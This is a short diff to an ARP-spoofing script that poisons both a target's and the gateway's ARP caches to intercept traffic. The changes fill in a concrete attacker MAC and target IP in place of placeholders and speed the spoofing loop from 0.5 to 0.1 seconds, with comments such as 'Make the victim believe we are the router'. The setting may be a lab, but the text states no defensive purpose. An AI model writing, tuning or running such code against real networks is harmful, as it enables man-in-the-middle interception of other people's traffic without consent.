@@ -66,8 +66,8 @@ def restore_arp(target_ip, spoof_ip):
 
 # ---------------------- MAIN SCRIPT -------------------------------
 
-ATTACKER_MAC = "aa:bb:cc:dd:ee:ff" # CHANGEME
-TARGET_IP = "192.168.1.10" # CHANGEME
+ATTACKER_MAC = "08:00:27:76:f3:53" # CHANGEME
+TARGET_IP = "192.168.1.37" # CHANGEME
 GATEWAY_IP = get_gateway()
 
 if GATEWAY_IP:
@@ -81,7 +81,7 @@ try:
     while True:
         arp_spoof(TARGET_IP, GATEWAY_IP, ATTACKER_MAC)  # Make the victim believe we are the router
         arp_spoof(GATEWAY_IP, TARGET_IP, ATTACKER_MAC)  # Make the router believe we are the victim
-        time.sleep(0.5)
+        time.sleep(0.1)
 except KeyboardInterrupt:
     print("\n[!] Stopping attack. Restoring ARP tables...")
     restore_arp(TARGET_IP, GATEWAY_IP)
